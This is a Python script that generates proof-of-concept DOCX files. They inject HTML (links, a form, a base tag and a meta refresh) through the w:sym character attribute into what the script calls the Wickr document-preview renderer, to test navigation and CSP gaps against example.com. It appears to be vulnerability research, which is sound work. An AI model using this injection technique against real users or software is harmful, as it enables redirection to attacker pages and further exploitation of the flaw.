#!/usr/bin/env python3
"""Builds BENIGN navigation/form-action test DOCX files for the Wickr
docx-preview HTML-injection sink (w:sym/@w:char -> innerHTML).

File 1 (interactive): anchor link, POST-less form with submit button, and a
<base> tag. Used to test the absence of form-action / base-uri / navigate-to
CSP directives. All targets are https://example.com/ (IANA reserved).

File 2 (meta refresh): a <meta http-equiv="refresh"> with a 5-second delay.
Tests whether injected markup can navigate the TOP WebView without any user
interaction. Separated because a successful refresh destroys the test page.
"""
import os
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))

CONTENT_TYPES = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''

RELS = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>'''

DOC_TMPL = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t xml:space="preserve"> {label}</w:t></w:r></w:p>
    <w:p><w:r><w:sym w:font="Symbol" w:char="{wchar}"/></w:r></w:p>
    <w:sectPr/>
  </w:body>
</w:document>'''


def esc(raw: str) -> str:
    """Escape for placement inside the double-quoted w:char XML attribute."""
    return (raw.replace("&", "&amp;").replace("<", "&lt;")
               .replace(">", "&gt;").replace('"', "&quot;"))


def build(name: str, label: str, raw_payload: str) -> None:
    out = os.path.join(HERE, name)
    doc = DOC_TMPL.format(label=esc(label), wchar=esc(raw_payload))
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", CONTENT_TYPES)
        z.writestr("_rels/.rels", RELS)
        z.writestr("word/document.xml", doc)
    print("wrote", out, os.path.getsize(out), "bytes")


# File 1: interactive tests (anchor, form, base). All benign targets.
interactive = (
    '0;'
    '<div style="border:2px solid red;padding:12px;font-family:sans-serif">'
    '<p>WICKR NAV TESTS (benign, target=example.com)</p>'
    '<p>1. anchor: <a href="https://example.com/?wickr-nav=anchor">'
    'tap to navigate top</a></p>'
    '<p>2. form: <form action="https://example.com/?wickr-nav=form" method="get">'
    '<input type="text" name="q" value="wickr-form-test"/>'
    '<input type="submit" value="submit form"/></form></p>'
    '<p>3. base: <base href="https://example.com/"/> injected '
    '(relative resources would resolve to example.com)</p>'
    '</div>'
)

# File 2: meta refresh, 5s delay so the tester can read the page first.
meta = (
    '0;'
    '<div style="border:2px solid orange;padding:12px;font-family:sans-serif">'
    '<p>WICKR META REFRESH TEST - this page will try to navigate the TOP '
    'WebView to https://example.com/?wickr-nav=meta in 5 seconds.</p>'
    '</div>'
    '<meta http-equiv="refresh" content="5;url=https://example.com/?wickr-nav=meta"/>'
)

build("poc-docx-nav-tests.docx",
      "Wickr preview nav/form/base injection tests (benign).", interactive)
build("poc-docx-meta-refresh.docx",
      "Wickr preview meta-refresh top-navigation test (benign, 5s delay).", meta)
